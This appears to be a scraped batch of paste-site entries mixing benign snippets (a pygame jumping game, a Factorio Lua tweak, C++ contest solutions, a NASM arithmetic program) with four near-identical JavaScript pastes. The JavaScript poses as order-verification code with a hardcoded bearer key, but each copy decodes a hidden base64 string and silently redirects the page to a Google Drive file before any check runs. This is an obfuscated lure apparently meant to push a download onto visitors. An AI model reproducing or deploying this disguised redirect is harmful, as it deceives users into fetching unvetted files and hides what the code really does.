WIDTH, HEIGHT = 800, 400
GRAVITY = 0.8
JUMP_STRENGHT = -15
SPEED = 6
OBSTACLE_WIDTH = 40
OBSTACLE_HEIGHT = 60
GAP_BETWEEN_OBSTACLES = 300

# Задаем цвета
WHITE = (255, 255, 255)
BLUE = (0, 150, 255)
RED = (255, 0, 0)
BACKGROUND_COLOR = (30,30,30)
GROUND_COLOR = (38,236,104)

screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption(""Ers first game"")

class Player:
    def __init__(self):
        self.rect = pygame.Rect(100,HEIGHT - 80, 30, 30)
        self.vel_y = 0
        self.on_ground = False
    def jump(self):
        if self.on_ground:
            self.vel_y = JUMP_STRENGHT
            self.on_ground = False
    def update(self):
        self.vel_y += GRAVITY
        self.rect.y += self.vel_y

        if self.rect.bottom > HEIGHT - 50:
            self.rect.bottom = HEIGHT - 50
            self.vel_y = 0
            self.on_ground = True
    def draw(self,screen):
        pygame.draw.rect(screen, BLUE, self.rect)"
9fpuDxRv,Market.js,WantingTrae,JavaScript,Saturday 5th of April 2025 01:35:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23646/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
42uDQvDY,Untitled,WantingTrae,JavaScript,Saturday 5th of April 2025 01:19:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67584/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8uqQj6vY,data-updates,Krypt0n_C0R3,Lua,Saturday 5th of April 2025 01:19:42 PM CDT,"for _, machine in pairs(data.raw[""furnace""]) do
        if not(machine.module_slots == nil) and machine.module_slots > 0 then
            machine.module_slots = machine.module_slots + 8
            machine.allowed_module_categories = {""hc-heating-coils""}
            machine.icons_positioning =
            {
                {inventory_index = defines.inventory.furnace_modules, shift = {0, 1}, multi_row_initial_height_modifier = -0.3, max_icons_per_row = 5, scale = 0.42}
            }
        end
    end"
zESJy2js,Confronto de Horários,matheus_monteiro,C++,Saturday 5th of April 2025 01:15:18 PM CDT,"#include ""bits/stdc++.h""

using namespace std;

bool tem_sobreposicao(pair<int, int> a, pair<int, int> b) {
    return a.first >= b.first && a.first < b.second ||
            b.first >= a.first && b.first < a.second;
}

int main() {
    int n;
    vector<pair<int, int>> v;

    cin >> n;
    for(int i = 0; i < n; ++i) {
        int x, y;
        cin >> x >> y;
        v.push_back(make_pair(x, y));
    }

    for(int i = 0; i < n; ++i)
        for(int j = 0; j < n; ++j)
            if(i != j && tem_sobreposicao(v[i], v[j])) {
                cout << ""YES\n"";
                return 0;
            }

    cout << ""NO\n"";

    return 0;
}"
g2hksrPe,Products.js,WantingTrae,JavaScript,Saturday 5th of April 2025 01:04:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33938/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1fiQzV77,Order.js,WantingTrae,JavaScript,Saturday 5th of April 2025 12:48:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25981/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DFyH8wAA,Untitled,dllbridge,ASM (NASM),Saturday 5th of April 2025 12:42:02 PM CDT,"format  PE console
entry   start
include 'win32ax.inc'
include 'api\kernel32.inc'

section '.data' data readable writeable

           x     db  45
           y     db  50
           r_1   dw  ?       ; = 47
           r_2   dw  ?       ; = 75

section '.code' code readable executable

start:    mov  eax, 0

          mov  al, [x]
          mov  bl, [y]
          add  al, bl        ; 1) 45 + 50 = 95
          shr  al, 1         ; 2) 95 / 2  = 47 = r_1
          mov  [r_1], ax
          ;------------------------
          mov  eax, 0
          mov  ebx, 0
          mov  al, [x]
          mov  bl, [y]
          mul  bx            ; 3) 50 * 45 = 2250
          mov  bx, 30
          idiv bx            ; 4) 2250/30 = 75 = r_2
          ;------------------------

          add ax, [r_1]      ; 5) (r_1 + r_2) = (47 + 75) = 122 (answer)
          cinvoke  printf, <""(x + y)/2 + (y * x)/30 =  %d"", 10, 0>, eax

          ;------------------------
          cinvoke  scanf, <""%d"", 10, 0>, 76313
          invoke   ExitProcess, 0


section '.idata' import data readable
library kernel32, 'kernel32.dll',\
        msvcrt, 'msvcrt.dll'
 
import msvcrt,\
       printf, 'printf',\
       scanf, 'scanf'      "
ELFRVdeR,B - Organização de Gemas Mágicas,matheus_monteiro,C++,Saturday 5th of April 2025 12:33:39 PM CDT,"#include ""bits/stdc++.h""

using namespace std;

string s;
map<char, int> mapa;

bool comparar_letras(char a, char b) {
    return mapa[a] < mapa[b];
}

int main() {
    cin >> s;

    // s = ""abaaac"";
    // mapa[a] = 0 
    // mapa[b] = 1
    // mapa[c] = 5
    // mapa[a] < mapa[b]

    
    for(int i = 0; i < s.size(); ++i) {
        if(mapa.find(s[i]) == mapa.end()) {
            mapa[s[i]] = i;
        }
    }

    // for(auto it : mapa) {
    //     cout << it.first << ' ' << it.second << endl;
    // }


    sort(s.begin(), s.end(), comparar_letras);

    cout << s << endl;

    return 0;
}"
